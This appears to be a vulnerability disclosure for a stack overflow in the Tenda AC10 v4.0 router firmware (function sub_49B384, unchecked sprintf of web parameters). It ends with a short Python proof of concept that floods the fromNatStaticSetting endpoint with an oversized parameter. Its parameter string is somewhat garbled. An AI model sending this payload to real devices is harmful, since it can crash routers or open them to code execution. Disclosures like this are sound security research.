# Tenda router sub_49B384 function stack overflow vulnerability

> vendor:Tenda
>
> product:AC10
>
> version:v4.0 V16.03.10.20
>
> type:Stack Overflow

## Vulnerability Description

Tenda AC10V4.0 V16.03.10.20 were discovered to contain a stack overflow via the page parameter in the sub_49B384 function.

## Vulnerability Details

In the function, the Websgetvar function is called in line 13 and 14 to obtain a variable named "Entrys" and "Mitinterface" in the Web request, store its values ​​in pointer variable V2 and V4, and then pass the two variables directly to the Sprintf function. Without any length check, this may cause the stack buffer overflow. Therefore, by requesting this page, the attacker can leverage well-designed overflow dataly execute the rejection service attack or remote code execution.

![sub_49B384](https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/661309ba-38a0-49c8-b369-10023536b75e)


## POC

    import requests

    IP = "192.168.244.130"
    url = f"http://{IP}/goform/fromNatStaticSetting?"
    url += "entrys=mintinterface=" + "A" * 0x1000

    response = requests.get(url)
